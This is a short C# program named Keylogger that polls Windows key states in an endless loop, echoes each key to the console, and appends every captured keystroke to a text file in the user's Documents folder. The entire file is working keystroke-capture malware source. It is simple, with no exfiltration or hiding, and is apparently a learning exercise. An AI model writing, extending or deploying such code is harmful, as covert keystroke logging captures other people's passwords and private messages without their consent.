using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        // string to hold all of the keystrokes
        static string kellog = "";
        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            


            //plan 
            
            // 1 - Capture keystrokes and display them to the console
            while (true)
            {
                //pause and let other programs get a chance to run.
                Thread.Sleep(5);
                
                // check all keys for their state
                for (int i = 32; i < 127; i++)
                {
                   //print to console.
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char) i + ",");

                        // 2 - store the strokes into a text file 

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                    }
                }

            }



        }
    }
}
